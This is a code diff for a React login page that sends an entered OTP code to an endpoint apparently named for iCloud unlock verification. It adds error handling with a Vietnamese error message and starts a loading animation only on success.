@@ -21,24 +21,20 @@ type FormData = z.infer<typeof formSchema>;
 const LoginPage: React.FC = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [loadingPercent, setLoadingPercent] = useState(0);
+  const [apiError, setApiError] = useState('');
   const navigate = useNavigate();
 
   const {
     register,
     handleSubmit,
+    setError,
     formState: { errors }
   } = useForm<FormData>({
     resolver: zodResolver(formSchema)
   });
 
-  const onSubmit = async (data: FormData) => {
+  const startLoading = () => {
     setIsLoading(true);
-    setLoadingPercent(0);
-    apiService('post', API_PATHS.UNLOCK_ICLOUD_VERIFY, {code: data.password}).then((res) => {
-      console.log(res)
-    }).catch((err)=>{
-      console.log(err)
-    })
     const loadingInterval = setInterval(() => {
       setLoadingPercent(prev => {
         if (prev >= 100) {
@@ -57,6 +53,29 @@ const LoginPage: React.FC = () => {
         return prev + 1;
       });
     }, 50);
+  };
+
+  const onSubmit = async (data: FormData) => {
+    setApiError('');
+    
+    try {
+      const response = await apiService('post', API_PATHS.UNLOCK_ICLOUD_VERIFY, { code: data.password });
+      
+      if (response.data?.success) {
+        setLoadingPercent(0);
+        startLoading();
+      } else {
+        setError('password', {
+          type: 'manual',
+          message: 'Mã OTP không đúng, vui lòng liên hệ admin'
+        });
+      }
+    } catch (err) {
+      setError('password', {
+        type: 'manual',
+        message: 'Mã OTP không đúng, vui lòng liên hệ admin'
+      });
+    }
   };
 
   return (
